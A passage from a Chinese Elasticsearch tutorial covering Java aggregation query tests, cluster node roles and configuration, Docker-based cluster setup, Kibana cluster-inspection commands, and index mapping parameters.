elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Min min = aggregations.get(\"buyCountMin\");  \n                log.info(\"计算 buyCount 最小值：{} \", min.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 同时查询 2021-03 月 buyCount 的最大值和最小值：  \n     \\*/  \n    @Test  \n    void aggs5() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-03\");  \n        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(\"buyCountMax\").field(\"buyCount\");  \n        MinAggregationBuilder buyCountMin = AggregationBuilders.min(\"buyCountMin\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(buyCountMax)  \n                .withAggregations(buyCountMin)  \n//                .addAggregation(buyCountMax)  \n//                .addAggregation(buyCountMin)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Max max = aggregations.get(\"buyCountMax\");  \n                log.info(\"计算 buyCount 最大值：{} \", max.getValue());  \n                Min min = aggregations.get(\"buyCountMin\");  \n                log.info(\"计算 buyCount 最小值：{} \", min.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 查询所有 name 的去重后的数量  \n     \\*/  \n    @Test  \n    void aggs6() {  \n        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(\"distinctName\").field(\"name.keyword\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(distinctName)  \n//                .addAggregation(distinctName)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Cardinality cardinality = aggregations.get(\"distinctName\");  \n                log.info(\"计算 name 的去重后的数量：{} \", cardinality.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\*  查询 2021-04 月 name 的去重后的数量  \n     \\*/  \n    @Test  \n    void aggs7() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-04\");  \n        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(\"distinctName\").field(\"name.keyword\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(distinctName)  \n//                .addAggregation(distinctName)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Cardinality cardinality = aggregations.get(\"distinctName\");  \n                log.info(\"计算 name 的去重后的数量：{} \", cardinality.getValue());  \n            }  \n        }  \n    }  \n  \n  \n    /\\*\\*  \n     \\* 查询 BuyCount 的平均值  \n     \\*/  \n    @Test  \n    void aggs8() {  \n        AvgAggregationBuilder buyCountAvg = AggregationBuilders.avg(\"buyCountAvg\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(buyCountAvg)  \n//                .addAggregation(buyCountAvg)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Avg avg = aggregations.get(\"buyCountAvg\");  \n                log.info(\"计算 buyCount 的平均值：{} \", avg.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 一次查询 总数，最大值，最小值，平均值，总和  \n     \\*/  \n    @Test  \n    void aggs9() {  \n        StatsAggregationBuilder stats = AggregationBuilders.stats(\"stats\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(stats)  \n//                .addAggregation(stats)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Stats s = aggregations.get(\"stats\");  \n                log.info(\"计算 buyCount 的 count：{} \", s.getCount());  \n                log.info(\"计算 buyCount 的 min：{} \", s.getMin());  \n                log.info(\"计算 buyCount 的 max：{} \", s.getMax());  \n                log.info(\"计算 buyCount 的 avg：{} \", s.getAvg());  \n                log.info(\"计算 buyCount 的 sum：{} \", s.getSum());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 根据 createMonth 分组查询每个月的最大 buyCount  \n     \\*/  \n    @Test  \n    void aggs10() {  \n        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(\"createMonthGroup\").field(\"createMonth\")  \n                .subAggregation(AggregationBuilders.max(\"buyCountMax\").field(\"buyCount\"));  \n  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(createMonthGroup)  \n//                .addAggregation(createMonthGroup)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Terms terms = aggregations.get(\"createMonthGroup\");  \n                terms.getBuckets().forEach(bucket -> {  \n                    String createMonth = bucket.getKeyAsString();  \n                    Aggregations subAggs = bucket.getAggregations();  \n                    if (Objects.nonNull(subAggs)) {  \n                        Max max = subAggs.get(\"buyCountMax\");  \n                        log.info(\"计算 {} 月的最大值为：{} \", createMonth, max.getValue());  \n                    }  \n                });  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\*  查询每 createMonth 下，根据 sex 区分，统计buyCount 的平均值  \n     \\*/  \n    @Test  \n    void aggs11() {  \n        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(\"createMonthGroup\").field(\"createMonth\")  \n                .subAggregation(AggregationBuilders.terms(\"sexGroup\").field(\"sex\")  \n                        .subAggregation(AggregationBuilders.avg(\"buyCountAvg\").field(\"buyCount\")));  \n  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(createMonthGroup)  \n//                .addAggregation(createMonthGroup)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Terms terms = aggregations.get(\"createMonthGroup\");  \n                terms.getBuckets().forEach(bucket -> {  \n                    String createMonth = bucket.getKeyAsString();  \n                    Aggregations sexAggs = bucket.getAggregations();  \n                    if (Objects.nonNull(sexAggs)) {  \n                        Terms sexTerms = sexAggs.get(\"sexGroup\");  \n                        sexTerms.getBuckets().forEach(sexBucket -> {  \n                            String sex = sexBucket.getKeyAsString();  \n                            Aggregations avgAggs = sexBucket.getAggregations();  \n                            if (Objects.nonNull(avgAggs)) {  \n                                Avg avg = avgAggs.get(\"buyCountAvg\");  \n                                log.info(\"计算 {} 月，{} 性 的平均值为：{} \", createMonth, sex, avg.getValue());  \n                            }  \n                        });  \n                    }  \n                });  \n            }  \n        }  \n    }  \n  \n}  \n  \n\n\n\n```\n\n5.3 ES ES工业级Java 应用开发\n---------------------\n\n一般不会直接使用RestHighLevelClient对于ES操作，因为语法过于繁琐，重复，基于分离变和不变的原则可以进行工业级封装。\n\nhttp://localhost:8080/doc.html\n\n![](./2024/06/16/ES从入门到精通/22.png)\n工业级封装后的Service：\n\n> 文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》\n\n6 ES集群架构\n========\n\n6.1 ES集群的5大角色\n-------------\n\n1.  **Master Node ：主节点**\n\n\n主节点，该节点不和应用创建连接，每个节点都保存了集群状态。master节点控制整个集群的元数据。只有Master Node节点可以修改节点状态信息，及元数据(metadata)的处理。 元数据(metadata)，比如：\n\n*   索引的分片信息 、主副本信息\n\n*   分片的节点分配信息，路由分配\n\n*   index 、type、Mapping\n\n*   Setting 配置等等。\n\n\n从资源占用的角度来说：master节点不占用磁盘IO和CPU，内存使用量一般， 没有data 节点高类似于kafa中的 controller，负责集群元数据的管理和维护\n\n2.  **Master eligible nodes ：合格节点** 有资格成为Master节点但暂时并不是Master的节点被称为 eligible 节点，该节点可以参加选主流程，成为Master节点. 该节点只是与集群保持心跳，判断Master是否存活，如果Master故障则参加新一轮的Master选举。 从资源占用的角度来说：eligible节点比Master节点更节省资源，因为它还未成为 Master 节点， 只是有资格成功Master节点。\n\n3.  **Data Node ：数据节点** 职责： 数据节点，用于建立文档索引，管理shard。 类似于rocket 中的 broker，负责数据的管理和维护，数据节点职责：\n\n\n*   该节点用于建立文档索引， 接收 应用创建连接、接收索引请求\n\n*   查询，接收用户的搜索请求\n\n\ndata节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消 耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 数据节点：保存包含索引文档的分片数据，执行CRUD、搜索、聚合相关的操作。属于：内存、CPU、IO密集型，对硬件资源要求高。 从资源占用的角度来说：data节点会占用大量的CPU、IO和内存\n\n4.  **Coordinating Node ：协调节点(/路由节点/client节点)**\n\n\n协调节点，该节点专用与接收应用的查询连接、接受搜索请求，但其本身不负责存储数据 协调节点，接受客户端搜索请求后将请求转发到与查询条件相关的多个data节点的分片上，然后多个data节点的分片执行查询语句或者查询结果再返回给协调节点，协调节点把各个data节点的返回结果进行整合、排序等一系列操作后再将最终结果返回给用户请求。 data节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 搜索请求在两个阶段中执行（query 和 fetch），这两个阶段由接收客户端请求的节点 - 协调节点协调。\n\n*   在请求query 阶段，协调节点将请求转发到保存数据的数据节点。每个数据节点在本地执行请求并将其结果返回给协调节点。\n\n*   在收集fetch阶段，协调节点将每个数据节点的结果汇集为单个全局结果集。\n\n\n从资源占用的角度来说：协调节点，可当负责均衡节点，该节点不占用io、cpu和内存 总结：Coordinating 大致的职责 ： 请求分发、结果的合并\n\n5.  **Ingest Node ：ingest节点**\n\n\ningest 节点可以看作是数据前置处理转换的节点，支持 pipeline管道 设置，可以使用 ingest 对数据进 行过滤、转换等操作，类似于 logstash 中 filter 的作用，功能相当强大。 Ingest节点处理时机——在数据被索引之前，通过预定义好的处理管道对数据进行预处理。默认情况下，所有节点都启用Ingest，因此任何节点都可以处理Ingest任务。 当然，我们也可以创建专用的Ingest节点。\n\n6.  **部落（tribe）**\n\n\n接着说一下ES里面的部落：tribe， 可以在查询过程中链接两个集群的数据，查询的数据将会汇总到tribe节点，有tribe节点对数据进行整合再发送给client； tribe还可以写数据，但是这里有一个限制，就是写的索引只能是一个集群所有；如果写入两个集群同名索引，那么只能成功写入一个，至于写入哪一个可以通过配置偏好实现。 可以通过配置指明tribe只能读，不能写。\n\n6.2 ES集群节点角色配置\n--------------\n\n```\n\n\n1. node.master  \n2. node.data  \n3. node.ingest  \n\n\n\n```\n\n配置实例/usr/share/elasticsearch/config/elasticsearch.yml\n\n```\n\n\nbootstrap.memory\\_lock: true  \ncluster.name: \"es-cluster\"  \nnode.name: master1  \nnode.master: true  \nnode.data: true  \nnetwork.host: 0.0.0.0  \nhttp.port: 9200  \ntransport.tcp.port: 9300  \ncluster.initial\\_master\\_nodes: \\[\"master1\"\\]  \ndiscovery.zen.ping.unicast.hosts: master1, master2, master3  \n#官方推荐 master-eligible nodes / 2 + 1 向下取整的个数  \ndiscovery.zen.minimum\\_master\\_nodes: 2  \npath.logs: /usr/share/elasticsearch/logs  \nhttp.cors.enabled: true  \nhttp.cors.allow-origin: \"\\*\"  \nxpack.security.audit.enabled: true  \n\n\n\n```\n\n默认情况下这三个属性的值都是true，实际上，一个节点在默认情况下会同时扮演：Master Node，Data Node 和 Ingest Node。\n\n| **节点类型** | **配置参数** | **默认值** |\n| --- | --- | --- |\n|Master Eligible| node.master| true|\n| Data| node.data| true|\n| Coordinating only| 无| \n\n设置上面2 个参数全为 false，节点为专用协调节点\n\n|| Ingest| node.ingest| true|\n\n6.3 ES节点配置组合\n------------\n\n1.  **组合1**\n\n\n```\n\n\nnode.master: true   \nnode.data: true   \nnode.ingest: true  \n\n\n\n```\n```\n\n\n这种组合表示这个节点既有成为主节点的资格，又可以存储数据，还可以作为预处理节点这个时候如果某个节点被选举成为了真正的主节点，那么他还要存储数据，这样对于这个节点的压力就比较大了。  \nelasticsearch 默认是：每个节点都是这样的配置，在测试环境下这样做没问题。实际工作中建议不要这  \n\n\n\n```\n\n样设置，这样相当于 主节点 和 数据节点 的角色混合到一块了。\n\n2.  **组合2**\n\n\n```\n\n\nnode.master: false   \nnode.data: true   \nnode.ingest: false  \n\n\n\n```\n\n这种组合表示这个节点没有成为主节点的资格，也就不参与选举，只会存储数据。这个节点我们称为 data(数据)节点。在集群中需要单独设置几个这样的节点负责存储数据。后期提供存储和查询服务\n\n3.  **组合3**\n\n\n```\n\n\nnode.master: true  \nnode.data: false  \nnode.ingest: false  \n\n\n\n```\n\n这种组合表示这个节点不会存储数据，有成为主节点的资格，可以参与选举，有可能成为真正的主节点。这个节点我们称为master节点\n\n4.  **组合4**\n\n\n```\n\n\nnode.master: false   \nnode.data: false   \nnode.ingest: true  \n\n\n\n```\n\n这种组合表示这个节点即不会成为主节点，也不会存储数据，这个节点的意义是作为一个 client(客户端)节点，主要是针对海量请求的时候可以进行负载均衡。 在新版 ElasticSearch5.x 之后该节点称之为：coordinate 节点，其中还增加了一个叫：ingest 节点，用 于预处理数据（索引和搜索阶段都可以用到）。 当然，作为一般应用是不需要这个预处理节点做什么额外的预处理过程，那么这个节点和我们称之为client 节点之间可以看做是等同的，我们在代码中配置访问节点就都可以配置这些 ingest 节点即可。‍\n\n6.4 高可用ES的部署架构\n--------------\n\n![](./2024/06/16/ES从入门到精通/23.png)\n1.  **小型的ES集群（<10）的节点架构**\n\n\n![](./2024/06/16/ES从入门到精通/24.png)\n*   对于Ingest转换节点，如果我们没有格式转换、类型转换等需求，直接设置为false。\n\n*   3-5个节点属于轻量级集群，要保证主节点个数满足((节点数/2)+1)。\n\n*   轻量级集群，节点的多重属性如：Master&Data设置为同一个节点可以理解的。\n\n*   如果进一步优化，5节点可以将Master和Data再分离。\n\n\n2.  **中型的ES集群（10-50）的节点架构**\n\n\n*   三台服务器做master节点 （可选）\n\n*   N（比如20）台服务器作为data节点（存储资源要大）\n\n*   N（比如5）台做coodinate/ingest节点（用于搜索结果合并，可以提高ES查询效率）\n\n\n![](./2024/06/16/ES从入门到精通/25.png)\n3.  **超大型的ES集群的节点架构（150个节点+）**\n\n\n可以按照100个节点为单位，分成多个集群，通过 tribenode连接，单个ES数据库最好的高可用集群部署架构为：每个集群，三台服务器做master节点\n\n*   N（比如50）台服务器作为data节点（存储资源要大）\n\n*   N（比如5）台做coodinate节点（用于搜索结果合并，可以提高ES查询效率）\n\n*   N（比如2）台做ingest节点（用于数据转换，可以提高ES索引效率）\n\n\n![](./2024/06/16/ES从入门到精通/26.png)\n6.5 小型ES集群的安装\n-------------\n\n### 6.5.1 Image镜像\n\n有外网环境，拉取镜像代码如下：\n\n```\n\n\n#下载elasticsearch,带中文分词器的版本  \ndocker pull andylsr/elasticsearch-with-ik-icu:7.14.0  \n#下载kibana  \ndocker pull docker.elastic.co/kibana/kibana:7.14.0  \n\n\n\n```\n\n无外网环境，可以先从有公网的环境拉取镜像，然后导出镜像\n\n```\n\n\ndocker save andylsr/elasticsearch-with-ik-icu:7.14.0 -o /root/elasticsearchwith-ik-icu.tar  \ndocker save docker.elastic.co/kibana/kibana:7.14.0 -o /root/kibana.tar  \n\n\n\n```\n\n然后上传导出的de镜像到dao目标虚拟机，然后导入镜像到docker\n\n```\n\n\ndocker load -i /vagrant/3G-middleware/elasticsearch-with-ik-icu.tar  \ndocker load -i /vagrant/3G-middleware/kibana.tar  \ndocker load -i /vagrant/3G-middleware/haproxy.tar  \n\n\n\n```\n\n### 6.5.2 创建目录结构\n\n```\n\n\nmkdir -p /home/docker-compose/elasticsearch7/{coordinate1,coordinate2}-{logs,data}  \nmkdir -p /home/docker-compose/elasticsearch7/{master1,master2,master3}-{logs,data}  \nchmod -R 777 /home/docker-compose/elasticsearch7  \n\n\n\n```\n\n### 6.5.3 安装ES集群\n\n把docker-compose和ES相应配置文件拷贝到`/home/docker-compose`目录下，执行如下命令安装ES集群\n\n```\n\n\ndocker-compose --compatibility up -d # 兼容模式后台启动  \n\n\n\n```\n\n*   \\--compatibility：表示已兼容模式启动容器\n\n*   \\-d：表示后台启动\n\n\n6.6 使用kibana访问集群\n----------------\n\n1.  **查看集群健康情况**\n\n\n```\n\n\nGET \\_cat/health?v  \n\n\n\n```\n\n结果：\n\n```\n\n\nepoch      timestamp cluster    status node.total node.data shards pri relo init unassign pending\\_tasks max\\_task\\_wait\\_time active\\_shards\\_percent  \n1670418184 13:03:04  es-cluster green           5         3     16   8    0    0        0             0                  -                100.0%  \n  \n\n\n\n```\n\nstatus选项的值\n\n*   green : 所有primary shard和replica shard都已成功分配, 集群是100%可用的\n\n*   yellow : 所有primary shard都已成功分配, 但至少有一个replica shard缺失. 此时集群所有功能都正常使用, 数据不会丢失, 搜索结果依然完整, 但集群的可用性减弱. —— 需要及时处理的警告\n\n*   red : 至少有一个primary shard(以及它的全部副本分片)缺失 —— 部分数据不能使用, 搜索只能返回部分数据, 而分配到这个分配上的写入请求会返回一个异常. 此时虽然可以运行部分功能, 但为了索引数据的完整性, 需要尽快修复集群\n\n\n2.  **查看集群中的节点个数**\n\n\n```\n\n\nGET \\_cat/nodes?v  \n\n\n\n```\n```\n\n\nip         heap.percent ram.percent cpu load\\_1m load\\_5m load\\_15m node.role   master name  \n172.19.0.2           36          95  12    0.20    0.43     0.73 cdfhilmrstw -      master2  \n172.19.0.7           75          95  12    0.20    0.43     0.73 cdfhilmrstw \\*      master3  \n172.19.0.5           29          95  12    0.20    0.43     0.73 cdfhilmrstw -      master1  \n172.19.0.6           64          96  12    0.20    0.43     0.73 lr          -      coordinate2  \n172.19.0.3           23          96  12    0.20    0.43     0.73 lr          -      coordinate1  \n\n\n\n```\n\n*   第一列（ip）：es节点ip\n\n*   第二列（heap.percent）：堆内存占比\n\n*   第三列（ram.percent）：内存使用占比\n\n*   第四列（cpu）：cpu使用率\n\n*   第五列（load\\_1m）：1分钟内平均load情况\n\n*   第六列（load\\_5m）：5分钟内平均load情况\n\n*   第七列（load\\_15m）：15分钟内平均load情况\n\n*   第八列（node.role）：节点权限\n\n*   第九列（master）：是否master节点，\\*为master节点\n\n*   第十列（name）：节点名称\n\n\n**（1）heap.percent** 表示ES使用的JVM内存情况，该值应该低于75，如果长时间大于75，表示JVM内存配置不够，如果JVM已经配置到30G，则表示该Datanode节点上的压力较大，需要考虑增加Datanode节点来分摊压力 **（2）ram.percent** 表示机器上内存的使用情况，实际对应linux上的 used+cache内存使用情况，如果该值接近100%，则表示机器上cache内存不够用，主要是由于ES检索中，lucene会消耗大量cache内存，如果cache不够，会导致lucene无法将部分文件加载到cache中，会频繁从磁盘中进行读取，导致查询延时加大\n\n3.  **查看集群中的索引**\n\n\n```\n\n\nGET \\_cat/indices?v  \n\n\n\n```\n```\n\n\nhealth status index                           uuid                   pri rep docs.count docs.deleted store.size pri.store.size  \ngreen  open   .kibana-event-log-7.14.0\\-000001 1uw627v6T8KPBv2xrlPlPQ   1   1          9            0     97.8kb         48.9kb  \ngreen  open   .kibana\\_7.14.0\\_001              1G2WGiXOT2Wvux7R\\_5TuLA   1   1         86           14      4.9mb          2.7mb  \ngreen  open   .apm-custom-link                dMukcWA2QVOFzsOhWiPOng   1   1          0            0       416b           208b  \ngreen  open   .apm-agent-configuration        ReYFH-LaQbmWjGTwif0nHA   1   1          0            0       416b           208b  \ngreen  open   .kibana\\_task\\_manager\\_7.14.0\\_001 H-3hQBgZRO2AfYsWLS6LQw   1   1         14         1275    622.9kb        337.1kb  \ngreen  open   user                            HdrFzj7TQ\\_ejXe\\_9Xdx1LQ   1   1          6            2     37.4kb         17.4kb  \ngreen  open   .tasks                          DudUNrFYTq24R7ZY9IFK5A   1   1         16            0     80.9kb         43.4kb  \n  \n\n\n\n```\n\n7 数据类型和映射\n=========\n\n7.1 映射的创建\n---------\n\n和传统数据库不同，传统的数据库我们尝试向表中插入数据的前提是这个表已经存在数据结构的定义，且插入数据的字段要在表结构中被定义。 而ES的映射的创建支持主动和被动创建。\n\n1.  **被动创建（动态映射）**\n\n\n此时字段和映射类型不需要事先定义，只需要存在文档的索引，当向此索引添加数据的时候当遇到不存在的映射字段，ES会根据数据内容自动添加映射字段定义。\n\n2.  **主动创建（显示映射）**\n\n\n动态映射只能保证最基础的数据结构的映射，所以很多时候我们需要对字段除了数据结构定义更多的限制的时候，动态映射创建的内容很可能不符合我们的需求，所以可以使用 PUT {index}/mapping 来更新指定索引的映射内容。\n\n7.2 动态映射Dynamic Mapping\n-----------------------\n\n写入文档的时候，索引不存在，会自动创建索引， 无需手动创建，ES会根据内容推断字段的类型，推断会不准确，可能造成某些功能无法使用，例如 范围查询。\n\n```\n\n\nPOST /log2/\\_doc/1  \n{  \n    \"uid\" : 1,  \n    \"ip\" : \"192.1.1.1\",  \n    \"transTime\" : \"2018-01-01\",  \n    \"content\" : \"中华人民共和国人民大会堂\"  \n}  \n\n\n\n```\n```\n\n\n查看一个索引当前的mapping  \n\n\n\n```\n```\n\n\nGET /log2/\\_mapping  \n\n\n\n```\n\n结果如下\n\n```\n\n\n{  \n    \"log2\": {  \n        \"mappings\": {  \n            \"properties\": {  \n                \"content\": {  \n                    \"type\": \"text\",  \n                    \"fields\": {  \n                        \"keyword\": {  \n                            \"type\": \"keyword\",  \n                            \"ignore\\_above\": 256  \n                        }  \n                    }  \n                },  \n                \"ip\": {  \n                    \"type\": \"text\",  \n                    \"fields\": {  \n                        \"keyword\": {  \n                            \"type\": \"keyword\",  \n                            \"ignore\\_above\": 256  \n                        }  \n                    }  \n                },  \n                \"transTime\": {  \n                    \"type\": \"date\"  \n                },  \n                \"uid\": {  \n                    \"type\": \"long\"  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n```\n\n\n动态映射规则\n\n\n```\n\n| **JSON中数据类型** | **Elasticsearch 数据类型** |\n| --- | --- |\n|null| 不添加任何字段|\n| true或者false| boolean类型|\n| 浮点数据| float类型|\n| integer数据| long类型|\n| object| object类型|\n| array| 取决于数组中的第一个非空值的类型。|\n| string| 匹配日期格式，设置为date；匹配数字，设置为float或者long，功能默认关闭；设置为text，并增加keyword子字段。|\n\n7.3 显示的设置mapping\n----------------\n\n显示的设置mapping可以更灵活控制ES。 映射创建时，除了对字段的定义，Mapping创建的时候提供了一些对于查询策略和自身定义的参数配置。 下面只是简单介绍下映射支持的字段参数内容。\n\n| 参数 | 说明 |\n| --- | --- |\n|analyzer| 定义此字段索引时使用的分词方式|\n| normalizer| normalizer功能类似于analyzer，但是其可以使查询条件输出唯一的查询条件（可以认为其只是实现了条件小写等不会产生多个查询条件的相关操作）|\n| boost| 定义当前字段的查询权重|\n| coerce| 此字段控制是否尝试修复部分错误的数据格式，（比如对一个整数字段插入字符串比如\"5\"，此时此字符串可以被解析为数字），默认为true|\n| copy\\_to| 类似于别名，不同之处参数可以将此字段内容复制到指定字段中，多个字段可以复制到同一个字段中|\n| doc\\_values| 倒排索引虽然可以快速查询文档中内容，但是在进行排序或聚合操作的时候，倒排索引并不能获得文档内容，所以需要存储一份文档数据到doc\\_values，而此参数控制字段是否需要存储在doc\\_values中的开关。|\n| dynamic| 是否开启动态映射，目前支持三个参数：true/false 开启和关闭，strict 当出现未定义的字段，抛出异常并拒绝添加文档|\n| enabled| 此参数控制字段是否可以被索引，当被设置为false的时候表示此字段仅用来存储而无需索引，此时ES不会分析此字段内的数据，所以即使插入的非法的数据内容ES依旧允许执行|\n| fielddata| 类似doc\\_values都是单独存储额外的文档数据，这样通过倒排索引获取文档内容，从而实现在排序和聚合上的功能。不同的是doc\\_values不支持text格式，text格式数据需要使用fielddata。此参数默认是禁止的，这是因为在第一次对字段进行排序或聚合的时候它会把这个列数据都加载到内存中，这样会带来大量的内存消耗。|\n| eager\\_global\\_ordinals| 是否使用全局序号来进行聚合。主要在聚合分析构建hash的时候，使用序号来替代doc的值，这样在文档收集阶段根据需要收集到各个桶中，在计算结果时将序号转换为具体doc内容。但是此操作在每次查询时需要重建doc序号关系|\n| format| 日期类型字段用来解析的日期格式|\n| ignore\\_above| 当插入字段长度超过此字段设置的值后，此内容将不被索引或存储。对于数组结构字段会作用到每一个元素|\n| ignore\\_malformed| 当向一个字段插入错误的数据类似时，会抛出异常并拒绝文档。但设置此参数后，对字段插入错误的数据时会忽略异常，此文档错误的数据将不被索引，但是其他字段则正常。|\n| index\\_options| 控制将哪些信息添加到反向索引中|\n| index\\_phrases| 主要将两个单词的组合索引到单独字段中，这样在进行精确的短语查询的时候会更有效。支持true和false参数。默认为false。此参数会使索引变大|\n| index\\_prefixes| 允许对字段的前缀进行索引，此参数用来提高查询的速度|\n| index| 控制字段是否可以被索引，被设置为false的字段无法被索引到|\n| fields| 此参数可以为同一个字段设置不同的索引方式，但是在\\_source字段中只会保存一份，并不会实际增加存储。但是会增加索引大小|\n| norms| norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false|\n| null\\_value| 一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引|\n| position\\_increment\\_gap| 增加近似值匹配|\n| properties| 定义类型映射、对象字段和嵌套字段等数据|\n| search\\_analyzer| 定义此字段查询时使用的分词方式|\n| similarity| 此参数可以配置用来计算字段相似性的算法|\n| store| 默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。|\n| term\\_vector| 术语向量的定义，存储一些术语向量，以便可以为特定文档检索它们|\n| index| 控制字段是否可以被索引，被设置为false的字段无法被索引到|\n| fields| 此参数可以为同一个字段设置不同的索引方式，但是在\\_source字段中只会保存一份，并不会实际增加存储。但是会增加索引大小|\n| norms| norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false|\n| null\\_value| 一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引|\n| position\\_increment\\_gap| 增加近似值匹配|\n| properties| 定义类型映射、对象字段和嵌套字段等数据|\n| search\\_analyzer| 定义此字段查询时使用的分词方式|\n| similarity| 此参数可以配置用来计算字段相似性的算法|\n| store| 默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。|\n\n1.  **index** 表示字段是否索引。\n\n2.  **index\\_options**\n\n\nindex\\_options 控制倒排索引记录的内容，一共有4种配置可选。\n\n| index\\_options | 含义 |\n| --- | --- |\n|docs| 只记录文档id（ doc id ）|\n| freqs| 记录 doc id 和 term frequences|\n| positions| doc id 、 term frequences 、 term position|\n| offsets| doc id 、 term frequences 、 term position 、 character|\n| offsets|    |\n\n文本类型 text 默认的配置是 positions ，其他默认是docs。 需要注意的是，虽然index\\_options提供了offsets这种内容较多的配置级别，但是记录的内容越多，占用的空间也会越多，在实际操作中还是要根据实际情况进行配置。 例如创建mapping,字段名为user\\_name，字符串类型。user\\_name不需要索引,info字段的倒排索引类型为positions。\n\n```\n\n\nPUT mapping\\_test3  \n{  \n    \"mappings\": {  \n        \"properties\": {  \n            \"user\\_name\": {  \n                \"index\": false,  \n                \"type\": \"text\"  \n            },  \n            \"info\": {  \n                \"index\\_options\": \"positions\",  \n                \"type\": \"text\"  \n            },  \n            \"doc\": {  \n                \"type\": \"text\",  \n                \"index\\_options\": \"docs\"  \n            },  \n            \"freq\": {  \n                \"type\": \"text\",  \n                \"index\\_options\": \"freqs\"  \n            },  \n            \"offset\": {  \n                \"type\": \"text\",  \n                \"index\\_options\": \"offsets\"  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n3.  **ANALYZER** 分词器。es有内置的分词器，也可以使用第三方的分词工具。如IK。\n\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  \n                \"content\": {  \n                    \"type\": \"text\",  \n                    \"analyzer\": \"ik\\_max\\_word\",//写入是的分词器  \n                    \"search\\_analyzer\": \"ik\\_max\\_word\"//搜索时的分词器  \n                }  \n            }  \n        }  \n    }  \n}  \n\n\n\n```\n\n4.  **COPY\\_TO**\n\n\n允许将一个或者多个字段的值复制到某一个字段中。用来满足一些搜索需要，类似于数据库 title like \"%a%\" or title2 like \"%a%\" copy\\_to的字段不会出现在\\_source里面\n\n```\n\n\n{  \n    \"mappings\": {  \n        \"my\\_type\": {  \n            \"properties\": {  